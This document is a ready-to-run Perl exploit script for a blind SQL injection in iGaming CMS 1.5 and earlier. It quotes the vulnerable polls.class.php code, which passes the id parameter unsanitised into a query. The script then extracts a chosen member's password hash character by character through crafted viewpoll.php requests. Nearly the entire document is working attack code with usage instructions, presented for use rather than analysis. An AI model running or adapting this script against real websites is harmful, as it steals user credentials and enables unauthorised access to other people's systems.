iGaming CMS <= 1.5 Blind SQL Injection Exploit
==============================================

#!/usr/bin/env perl
 
=pod
iGaming CMS <= 1.5 Blind SQL Injection
 
Author: plucky
Email: io.plucky@gmail.com
Web Site: http://plucky.heliohost.org
Crew : WarWolfZ
 
Usage:   perl exploit.pl <website> <user_id>
Example: perl exploit.pl http://website.net/iGamingCMS1.5/ 1
 
Vulnerability: polls.class.php
[line 10-17]
 
if (!empty($_REQUEST[&#039;id&#039;]))
{
  $poll = $db->Execute("
                        SELECT id,title
                        FROM `sp_polls`
                        WHERE `id` = &#039;" . $_REQUEST[&#039;id&#039;] . "&#039;");
 
$result = $db->Execute("SELECT * FROM sp_polls_options WHERE poll_id = &#039;$_REQUEST[id]&#039; ORDER BY id");
 
THX TO: shrod and warwolfz crew
=cut
 
use strict;
use warnings;
use LWP::Simple;
 
my $password               = &#039;&#039;;
my $vulnerable_page        = &#039;&#039;;
 
my $target_id              =  1;
 
sub header_exploit {
    
   print &#039;iGaming CMS <= 1.5 Blind SQL Injection&#039;    . "\n".
         &#039;-----------------------------------------&#039; . "\n".
         &#039;Author:  plucky&#039;                           . "\n".
         &#039;Email:   io.plucky@gmail.com&#039;              . "\n".
         &#039;-----------------------------------------&#039; . "\n".
         &#039;[!]Target id: &#039;.$target_id                 . "\n".
         &#039;[!]Exploit Status: Working...&#039;             . "\n";
}
 
sub usage_exploit {
 
   print &#039;Usage:&#039;                                                    . "\n".
         &#039;      perl exploit.pl http://[site]/[path]/ [id]&#039;          . "\n".
         &#039;Examples:&#039;                                                 . "\n".
         &#039;         perl&#039; . $0 . &#039;http://web_site/cms/ 1&#039;             . "\n".
         &#039;         perl&#039; . $0 . &#039;http://games_site/iGamingCMS1.5/ 1&#039; . "\n";
 
exit;
}
 
sub run_exploit {
    
   my $parameter_id           = shift;
   my $parameter_page         = shift;
 
   my $target_id              = $$parameter_id;
   my $vulnerable_page        = $$parameter_page;
 
   my $character_id           =  1;
 
   my $HTML_source            = &#039;&#039;;
   my $SQL_Injection          = &#039;&#039;;
   my $hexadecimal_character  = &#039;&#039;;
   my $result                 = &#039;&#039;;
   my $table                  = &#039;sp_members&#039;;
 
   my @hexadecimal_characters = ( 48..57, 97..102 );
 
 
   foreach $character_id ( 1..32 ) {
        
   character_research:
          foreach $hexadecimal_character ( @hexadecimal_characters ) {
 
                 $SQL_Injection  = "viewpoll.php?id=&#039; or ascii(substring((select pass from $table where id=$target_id),$character_id,1))=$hexadecimal_character\%23";
                 $HTML_source = get( $vulnerable_page.$SQL_Injection );
 
                 if ( $HTML_source !~ /Error/i ) {
 
                   $result .= chr($hexadecimal_character);
                   $character_id++;
 
                   last character_research;
       }
     }
   }
    
   return $result;
}
 
$vulnerable_page = $ARGV[0] || usage_exploit;
$target_id       = $ARGV[1] || usage_exploit;
 
header_exploit;
$password = run_exploit ( \$target_id, \$vulnerable_page );
 
print &#039;[!]Password: &#039;, $password, "\n";



